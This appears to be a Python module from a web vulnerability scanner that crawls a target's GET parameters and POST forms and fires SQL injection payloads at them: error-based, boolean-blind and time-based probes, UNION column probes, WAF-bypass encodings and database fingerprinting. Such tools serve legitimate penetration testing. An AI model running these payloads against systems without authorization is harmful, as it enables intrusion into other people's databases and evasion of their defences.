# modules/sqli.py
# Advanced SQL Injection Scanner
# Techniques: Error-based, Boolean-based blind, Time-based blind, UNION-based
# Features : WAF detection, DB fingerprinting, WAF-bypass encoding,
#            concurrent testing, structured findings, numeric-vs-string context
from config import HEADERS, TIMEOUT
import requests
import time
import difflib
import logging
import hashlib
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Optional

logger = logging.getLogger(__name__)

# ─────────────────────────────────────────────
# Data model
# ─────────────────────────────────────────────
@dataclass
class Finding:
    severity:   str           # Critical / High / Medium / Low / Info
    technique:  str           # Error-based, Boolean-based, etc.
    method:     str           # GET / POST
    url:        str
    parameter:  str
    payload:    str
    evidence:   str           # snippet that triggered detection
    db_hint:    str = ""      # fingerprinted DBMS
    waf_bypass: bool = False

    def __str__(self):
        bypass = " [WAF-bypass]" if self.waf_bypass else ""
        db     = f" | DB: {self.db_hint}" if self.db_hint else ""
        return (f"[{self.severity}] {self.technique}{bypass} | "
                f"{self.method} {self.url} | param={self.parameter} | "
                f"payload={self.payload!r}{db} | evidence={self.evidence!r}")

    def dedup_key(self):
        return hashlib.md5(
            f"{self.url}:{self.parameter}:{self.technique}".encode()
        ).hexdigest()


# ─────────────────────────────────────────────
# Payload library
# ─────────────────────────────────────────────

# Error-based — generic + DBMS-specific
ERROR_PAYLOADS = [
    # Generic quote break
    "'", '"', "';--", '";--', "')", '")',
    # Classic OR-true
    "' OR '1'='1", "' OR 1=1--", '" OR "1"="1', "1' OR '1'='1'--",
    # Stacked / DDL probes (safe – table name won't exist)
    "'; SELECT 1--", "1; SELECT SLEEP(0)--",
    # UNION column probes (1–4 columns)
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    # DB-fingerprint probes
    "' AND 1=CONVERT(int,(SELECT @@version))--",        # MSSQL
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",   # MySQL
    "' AND 1=1 AND (SELECT 1 FROM dual)--",             # Oracle
    "' AND 1=CAST(version() AS int)--",                 # PostgreSQL
    "1 AND 1=2 UNION SELECT sqlite_version()--",        # SQLite
]

# Boolean-based blind (true / false pairs — must be tested as pairs)
BOOLEAN_PAIRS = [
    ("' AND 1=1--",          "' AND 1=2--"),
    ("' AND 'a'='a'--",      "' AND 'a'='b'--"),
    ("1 AND 1=1",            "1 AND 1=2"),
    ("' AND LENGTH(database())>0--", "' AND LENGTH(database())>99--"),
]

# Time-based blind
TIME_PAYLOADS = [
    ("' AND SLEEP(4)--",                  "mysql"),
    ("1; WAITFOR DELAY '0:0:4'--",        "mssql"),
    ("' AND pg_sleep(4)--",               "postgresql"),
    ("1 AND 1=1 AND SLEEP(4)--",          "mysql"),
    ("'; SELECT pg_sleep(4)--",           "postgresql"),
    ("' OR SLEEP(4)--",                   "mysql"),
    ("1 AND RANDOMBLOB(500000000/2)--",   "sqlite"),  # CPU-delay
]

# WAF-bypass variants of the simplest error payload
WAF_BYPASS_PAYLOADS = [
    "%27",                  # URL-encoded '
    "%2527",                # Double-encoded
    "' /*!OR*/ '1'='1",     # MySQL inline comment
    "'/**/OR/**/'1'='1",    # Comment padding
    "'%09OR%091=1--",       # Tab characters
    "'\u0009OR\u00091=1--", # Unicode tab
    "' oR '1'='1",          # Mixed case
    "'||'1'='1",            # Oracle concat bypass
    "' OR 0x31=0x31--",     # Hex literals
]

# DBMS error signatures
DB_ERROR_MAP = {
    "mysql":      ["you have an error in your sql syntax", "mysql_fetch", "mysql_num_rows",
                   "supplied argument is not a valid mysql", "com.mysql.jdbc"],
    "mssql":      ["unclosed quotation mark", "microsoft ole db", "odbc sql server",
                   "mssql_query", "sqlserver", "microsoft jet database"],
    "postgresql": ["pg_query", "postgresql", "psql", "pg_exec", "unterminated quoted"],
    "oracle":     ["ora-01756", "ora-00907", "ora-00933", "oracle error", "quoted string not properly terminated"],
    "sqlite":     ["sqlite3_", "sqlite error", "no such table", "unrecognized token"],
    "generic":    ["sql syntax", "sql error", "db error", "database error",
                   "syntax error", "jdbc exception", "nhibernate", "hibernate"],
}

ALL_ERROR_KEYWORDS = [kw for kws in DB_ERROR_MAP.values() for kw in kws]


# ─────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────

def _fingerprint_db(text: str) -> str:
    """Return DBMS name from error text, or empty string."""
    tl = text.lower()
    for db, keywords in DB_ERROR_MAP.items():
        if any(kw in tl for kw in keywords):
            return db
    return ""


def _detect_waf(resp: requests.Response) -> bool:
    """Heuristic: common WAF headers or body patterns."""
    waf_headers = {"x-sucuri-id", "x-firewall", "x-waf", "cf-ray",
                   "x-cdn", "server-timing", "x-protected-by"}
    if any(h in resp.headers for h in waf_headers):
        return True
    waf_bodies = ["access denied", "request blocked", "security check",
                  "you have been blocked", "cloudflare ray id"]
    body = resp.text.lower()
    return any(kw in body for kw in waf_bodies)


def _similarity(a: str, b: str) -> float:
    """Return ratio of similarity between two response texts."""
    return difflib.SequenceMatcher(None, a[:4000], b[:4000]).ratio()


def _get_safe(url: str, session: requests.Session) -> Optional[requests.Response]:
    try:
        return session.get(url, headers=HEADERS, timeout=TIMEOUT * 2, allow_redirects=True)
    except Exception as exc:
        logger.debug("GET failed %s: %s", url, exc)
        return None


def _post_safe(url: str, data: dict, session: requests.Session) -> Optional[requests.Response]:
    try:
        return session.post(url, data=data, headers=HEADERS,
                            timeout=TIMEOUT * 2, allow_redirects=True)
    except Exception as exc:
        logger.debug("POST failed %s: %s", url, exc)
        return None


def _evidence_snippet(text: str, keywords: list[str], window: int = 80) -> str:
    """Extract up to `window` chars around the first matched keyword."""
    tl = text.lower()
    for kw in keywords:
        idx = tl.find(kw)
        if idx != -1:
            start = max(0, idx - 20)
            return text[start: start + window].replace("\n", " ").strip()
    return ""


# ─────────────────────────────────────────────
# Per-parameter test worker
# ─────────────────────────────────────────────

def _test_parameter(
    base_url:      str,
    param_name:    str,
    baseline_resp: requests.Response,
    session:       requests.Session,
    method:        str = "GET",
    form_action:   str = "",
    form_inputs:   list[str] = None,
) -> list[Finding]:
    """
    Run all injection techniques against a single parameter.
    Returns a list of Finding objects (may be empty).
    """
    findings: list[Finding] = []
    seen_techniques: set[str] = set()
    waf_detected = _detect_waf(baseline_resp)
    parsed       = urlparse(base_url)
    base_params  = parse_qs(parsed.query)

    def build_get_url(payload: str) -> str:
        p = base_params.copy()
        p[param_name] = [payload]
        return parsed._replace(query=urlencode(p, doseq=True)).geturl()

    def fire_get(payload: str) -> Optional[requests.Response]:
        return _get_safe(build_get_url(payload), session)

    def fire_post(payload: str) -> Optional[requests.Response]:
        data = {name: payload for name in (form_inputs or [param_name])}
        return _post_safe(form_action or base_url, data, session)

    def fire(payload: str) -> Optional[requests.Response]:
        return fire_post(payload) if method == "POST" else fire_get(payload)

    # ── 1. Error-based ──────────────────────────────────────────────
    all_error_payloads = (
        ERROR_PAYLOADS + WAF_BYPASS_PAYLOADS if waf_detected else ERROR_PAYLOADS
    )
    for payload in all_error_payloads:
        if "Error-based" in seen_techniques:
            break
        r = fire(payload)
        if r is None:
            continue
        db = _fingerprint_db(r.text)
        if any(kw in r.text.lower() for kw in ALL_ERROR_KEYWORDS):
            snippet = _evidence_snippet(r.text, ALL_ERROR_KEYWORDS)
            poc_url = build_get_url(payload) if method == "GET" else f"POST {form_action}"
            findings.append(Finding(
                severity   = "Critical",
                technique  = "Error-based",
                method     = method,
                url        = poc_url,
                parameter  = param_name,
                payload    = payload,
                evidence   = snippet,
                db_hint    = db,
                waf_bypass = payload in WAF_BYPASS_PAYLOADS,
            ))
            seen_techniques.add("Error-based")

    # ── 2. Boolean-based blind ──────────────────────────────────────
    if "Boolean-based" not in seen_techniques:
        for true_pl, false_pl in BOOLEAN_PAIRS:
            r_true  = fire(true_pl)
            r_false = fire(false_pl)
            if r_true is None or r_false is None:
                continue
            sim = _similarity(r_true.text, r_false.text)
            base_sim = _similarity(baseline_resp.text, r_true.text)
            # True branch ≈ baseline; false branch markedly different
            if base_sim > 0.85 and sim < 0.70:
                poc_url = build_get_url(true_pl) if method == "GET" else f"POST {form_action}"
                findings.append(Finding(
                    severity  = "High",
                    technique = "Boolean-based blind",
                    method    = method,
                    url       = poc_url,
                    parameter = param_name,
                    payload   = f"true={true_pl!r} / false={false_pl!r}",
                    evidence  = f"similarity={sim:.2f} (true vs false), base_sim={base_sim:.2f}",
                ))
                seen_techniques.add("Boolean-based")
                break

    # ── 3. Time-based blind ─────────────────────────────────────────
    if "Time-based" not in seen_techniques:
        SLEEP_THRESHOLD = 3.5  # seconds
        for payload, db_hint in TIME_PAYLOADS:
            # Quick sanity: first confirm baseline response is fast
            baseline_time = getattr(baseline_resp, "_elapsed_sec", None)
            start = time.time()
            r = fire(payload)
            elapsed = time.time() - start
            if r is None:
                continue
            if elapsed >= SLEEP_THRESHOLD:
                poc_url = build_get_url(payload) if method == "GET" else f"POST {form_action}"
                findings.append(Finding(
                    severity  = "High",
                    technique = "Time-based blind",
                    method    = method,
                    url       = poc_url,
                    parameter = param_name,
                    payload   = payload,
                    evidence  = f"Response delayed {elapsed:.2f}s (threshold {SLEEP_THRESHOLD}s)",
                    db_hint   = db_hint,
                ))
                seen_techniques.add("Time-based")
                break  # one confirmation is enough per parameter

    return findings


# ─────────────────────────────────────────────
# Public entry point
# ─────────────────────────────────────────────

def scan(target_url: str, pages: list[tuple[str, requests.Response]]) -> list[str]:
    """
    Advanced SQL Injection scan across all crawled pages.

    Args:
        target_url : root URL of the target (used for scoping)
        pages      : list of (url, response) tuples from the crawler

    Returns:
        List of human-readable finding strings, or a clean-bill-of-health message.
    """
    all_findings: list[Finding] = []
    seen_dedup:   set[str]      = set()
    session = requests.Session()

    tasks = []  # (callable, kwargs) to be executed concurrently

    for page_url, baseline_resp in pages:
        # ── GET parameters ────────────────────────────────────────────
        parsed = urlparse(page_url)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param_name in params:
                tasks.append((
                    _test_parameter,
                    dict(
                        base_url      = page_url,
                        param_name    = param_name,
                        baseline_resp = baseline_resp,
                        session       = session,
                        method        = "GET",
                    )
                ))

        # ── POST forms ────────────────────────────────────────────────
        soup = BeautifulSoup(baseline_resp.text, "html.parser")
        for form in soup.find_all("form"):
            action     = urljoin(page_url, form.get("action", "") or page_url)
            method_tag = form.get("method", "get").strip().lower()
            if method_tag != "post":
                continue
            form_inputs = [
                inp.get("name")
                for inp in form.find_all(["input", "textarea", "select"])
                if inp.get("name")
            ]
            if not form_inputs:
                continue
            for param_name in form_inputs:
                tasks.append((
                    _test_parameter,
                    dict(
                        base_url      = page_url,
                        param_name    = param_name,
                        baseline_resp = baseline_resp,
                        session       = session,
                        method        = "POST",
                        form_action   = action,
                        form_inputs   = form_inputs,
                    )
                ))

    # ── Concurrent execution ──────────────────────────────────────────
    max_workers = min(10, max(1, len(tasks)))
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {
            executor.submit(fn, **kwargs): kwargs
            for fn, kwargs in tasks
        }
        for future in as_completed(futures):
            try:
                results = future.result()
                for finding in results:
                    key = finding.dedup_key()
                    if key not in seen_dedup:
                        seen_dedup.add(key)
                        all_findings.append(finding)
            except Exception as exc:
                logger.warning("Worker raised: %s", exc)

    # ── Sort by severity ──────────────────────────────────────────────
    severity_order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Info": 4}
    all_findings.sort(key=lambda f: severity_order.get(f.severity, 9))

    if not all_findings:
        return ["✅ No SQL Injection vulnerabilities detected with current payloads."]

    output = [f"⚠️  {len(all_findings)} SQL Injection finding(s) detected:\n"]
    for i, f in enumerate(all_findings, 1):
        output.append(f"  [{i}] {f}")

    return output
